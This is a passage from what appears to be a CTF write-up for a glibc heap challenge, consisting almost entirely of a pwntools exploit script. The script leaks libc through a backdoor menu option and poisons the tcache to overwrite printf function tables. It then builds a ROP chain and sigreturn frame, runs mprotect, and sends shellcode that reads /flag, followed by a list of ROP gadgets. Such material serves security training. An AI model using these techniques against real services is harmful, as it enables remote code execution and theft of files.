punctuation">:</span> p<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">': \033[1;36m 0x%x \033[0m'</span> <span class="token operator">%</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>breakpoint<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    glibc_dir <span class="token operator">=</span> <span class="token string">'~/Exps/Glibc/glibc-2.27/'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    gdbscript <span class="token operator">=</span> <span class="token string">'directory %smalloc/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="22"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %sstdio-common/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="23"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %sstdlib/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="24"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %slibio/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="25"></td><td><pre>    elf_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'pmap &#123;&#125;| awk \x27&#123; &#123;print \x241&#125; &#125;\x27'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">if</span> elf<span class="token punctuation">.</span>pie <span class="token keyword">else</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'b *&#123;:#x&#125;\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>breakpoint<span class="token punctuation">)</span> <span class="token operator">+</span> elf_base<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>breakpoint<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> breakpoint</pre></td></tr><tr><td data-num="27"></td><td><pre>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> elf<span class="token punctuation">.</span>arch<span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-hp'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">#p = process('./pwn')</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">#debug()</span></pre></td></tr><tr><td data-num="34"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.166.147'</span><span class="token punctuation">,</span><span class="token number">58012</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Please input size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    sea<span class="token punctuation">(</span><span class="token string">'Please input content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Please input idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Please input idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token keyword">def</span> <span class="token function">bkdoor</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Please input idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment"># 8 9 11</span></pre></td></tr><tr><td data-num="63"></td><td><pre>bkdoor<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>libc_leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>libc_base <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">0x1ecbe0</span></pre></td></tr><tr><td data-num="67"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'libc_leak'</span><span class="token punctuation">,</span>libc_leak<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token comment">#libc = ELF('./libc.so.6')</span></pre></td></tr><tr><td data-num="70"></td><td><pre>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc</pre></td></tr><tr><td data-num="71"></td><td><pre>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base</pre></td></tr><tr><td data-num="72"></td><td><pre>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system</pre></td></tr><tr><td data-num="73"></td><td><pre>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre>__printf_arginfo_table <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1ed7b0</span></pre></td></tr><tr><td data-num="76"></td><td><pre>__printf_function_table <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1f1318</span></pre></td></tr><tr><td data-num="77"></td><td><pre>lock <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x222f68</span> <span class="token comment"># _rtld_global+3848</span></pre></td></tr><tr><td data-num="78"></td><td><pre>main_arena_x96 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1ecbe0</span></pre></td></tr><tr><td data-num="79"></td><td><pre>magic <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x154dea</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># 0</span></pre></td></tr><tr><td data-num="83"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token comment"># add(0x10) # 1 </span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token comment"># add(0x20,'\0'*0x10+p64()) # 2 </span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token comment"># # 7a0 </span></pre></td></tr><tr><td data-num="88"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># 1</span></pre></td></tr><tr><td data-num="89"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="91"></td><td><pre>    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>exit<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3</span></pre></td></tr><tr><td data-num="92"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token comment"># add(0x80) # 4</span></pre></td></tr><tr><td data-num="94"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="97"></td><td><pre></pre></td></tr><tr><td data-num="98"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__printf_arginfo_table<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token comment"># 20</span></pre></td></tr><tr><td data-num="101"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>__printf_arginfo_table <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">0x378</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>exit<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment"># 21</span></pre></td></tr><tr><td data-num="102"></td><td><pre></pre></td></tr><tr><td data-num="103"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="106"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__printf_function_table<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="108"></td><td><pre>add_rsp_x28 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047445</span></pre></td></tr><tr><td data-num="109"></td><td><pre>leave_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000578c8</span></pre></td></tr><tr><td data-num="110"></td><td><pre>ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000022679</span></pre></td></tr><tr><td data-num="111"></td><td><pre>rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">0x0000000000023b6a</span></pre></td></tr><tr><td data-num="112"></td><td><pre>rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002601f</span></pre></td></tr><tr><td data-num="113"></td><td><pre>rdx_r12 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000119211</span></pre></td></tr><tr><td data-num="114"></td><td><pre></pre></td></tr><tr><td data-num="115"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_arena_x96<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>add_rsp_x28<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__printf_function_table<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__printf_function_table<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdx_r12<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>read<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre></pre></td></tr><tr><td data-num="117"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="118"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="119"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="120"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># _dl_fini+113</span></pre></td></tr><tr><td data-num="122"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="123"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>gets<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre></pre></td></tr><tr><td data-num="125"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="127"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="128"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_arena_x96<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token comment"># add(0x90,'\0'*0x28+p64(0x91)+p64(lock)+p64(0))</span></pre></td></tr><tr><td data-num="130"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="131"></td><td><pre>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\xa0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="132"></td><td><pre><span class="token comment"># pause()</span></pre></td></tr><tr><td data-num="133"></td><td><pre>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="134"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">'Please input size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre><span class="token comment"># show(21)</span></pre></td></tr><tr><td data-num="136"></td><td><pre><span class="token comment"># dele(20)</span></pre></td></tr><tr><td data-num="137"></td><td><pre><span class="token comment"># add(1)</span></pre></td></tr><tr><td data-num="138"></td><td><pre>addr <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>__free_hook<span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">12</span></pre></td></tr><tr><td data-num="139"></td><td><pre>fuck <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="140"></td><td><pre>fuck<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="141"></td><td><pre>fuck<span class="token punctuation">.</span>rsi <span class="token operator">=</span> addr</pre></td></tr><tr><td data-num="142"></td><td><pre>fuck<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x300</span></pre></td></tr><tr><td data-num="143"></td><td><pre>fuck<span class="token punctuation">.</span>rsp <span class="token operator">=</span> addr <span class="token operator">+</span> <span class="token number">8</span></pre></td></tr><tr><td data-num="144"></td><td><pre>fuck<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>read</pre></td></tr><tr><td data-num="145"></td><td><pre>lock_rdi <span class="token operator">=</span> <span class="token number">0x222968</span> <span class="token operator">+</span> libc_base</pre></td></tr><tr><td data-num="146"></td><td><pre>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre>sl<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__printf_function_table<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="148"></td><td><pre></pre></td></tr><tr><td data-num="149"></td><td><pre>mmp <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="150"></td><td><pre>    <span class="token number">0</span><span class="token punctuation">,</span>rdi<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">12</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span><span class="token number">0x2000</span><span class="token punctuation">,</span>rdx_r12<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>mprotect<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>addr<span class="token operator">+</span><span class="token number">0x400</span><span class="token punctuation">,</span>rdx_r12<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>read<span class="token punctuation">,</span>libc_base <span class="token operator">+</span> <span class="token number">0x000000000010d5dd</span></pre></td></tr><tr><td data-num="151"></td><td><pre><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="152"></td><td><pre>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="153"></td><td><pre>sl<span class="token punctuation">(</span>mmp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="154"></td><td><pre></pre></td></tr><tr><td data-num="155"></td><td><pre>sl<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="156"></td><td><pre></pre></td></tr><tr><td data-num="157"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="158"></td><td><pre></pre></td></tr><tr><td data-num="159"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="160"></td><td><pre>0x00000000000248f1 : pop r15 ; pop rbp ; ret</pre></td></tr><tr><td data-num="161"></td><td><pre>0x0000000000023b69 : pop r15 ; ret</pre></td></tr><tr><td data-num="162"></td><td><pre>0x000000000005520f : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</pre></td></tr><tr><td data-num="163"></td><td><pre>0x00000000000226be : pop rax ; pop rbx ; pop rbp ; ret</pre></td></tr><tr><td data-num="164"></td><td><pre>0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</pre></td></tr><tr><td data-num="165"></td><td><pre>0x0000000000036174 : pop rax ; ret</pre></td></tr><tr><td data-num="166"></td><td><pre>0x0000000000023b62 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</pre></td></tr><tr><td data-num="167"></td><td><pre>0x0000000000026019 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</pre></td></tr><tr><td data-num="168"></td><td><pre>0x00000000000ef193 : pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret</pre></td></tr><tr><td data-num="169"></td><td><pre>0x0000000000025b9a : pop rbp ; pop r12 ; pop r13 ; ret</pre></td></tr><tr><td data-num="170"></td><td><pre>0x000000000008e22f : pop rbp ; pop r12 ; pop r14 ; ret</pre></td></tr><tr><td data-num="171"></td><td><pre>0x000000000002f708 : pop rbp ; pop r12 ; ret</pre></td></tr><tr><td data-num="172"></td><td><pre>0x000000000013641e : pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret</pre></td></tr><tr><td data-num="173"></td><td><pre>0x00000000000248ee : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</pre></td></tr><tr><td data-num="174"></td><td><pre>0x0000000000023b66 : pop rbp ; pop r14 ; pop r15 ; ret</pre></td></tr><tr><td data-num="175"></td><td><pre>0x000000000002601d : pop rbp ; pop r14 ; ret</pre></td></tr><tr><td data-num="176"></td><td><pre>0x00000000000ef197 : pop rbp ; pop r15 ; ret</pre></td></tr><tr><td data-num="177"></td><td><pre>0x0000000000046077 : pop rbp ; pop rbp ; ret</pre></td></tr><tr><td data-num="178"></td><td><pre>0x0000000000055bb8 : pop rbp ; pop rbx ; ret</pre></td></tr><tr><td 